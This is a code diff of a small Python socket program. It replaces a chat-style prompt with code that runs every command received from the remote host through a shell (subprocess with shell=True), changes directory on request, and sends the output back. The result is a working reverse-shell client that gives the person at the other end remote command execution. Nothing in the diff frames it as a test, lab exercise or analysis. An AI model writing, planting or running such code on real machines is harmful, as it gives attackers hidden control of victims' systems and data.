@@ -1,4 +1,6 @@
 import socket
+import subprocess
+import os
 
 def handler():
     print(f'[+] Connecting to {host_ip}.')
@@ -16,12 +18,17 @@ def handler():
                 sock.close()
                 break
 
-            response = input('[>] Client Message to send #> ')
-            sock.send(response.encode())
+            elif message.split(" ")[0] == 'cd':
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                current_dir = os.getcwd()
+                print(f'[+] Changed to {current_dir}')
+                sock.send(current_dir.encode())
 
-            if response == 'exit':
-                remote_target.close()
-                break
+            else:
+                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                sock.send(output)
 
         except KeyboardInterrupt:
             sock.close()
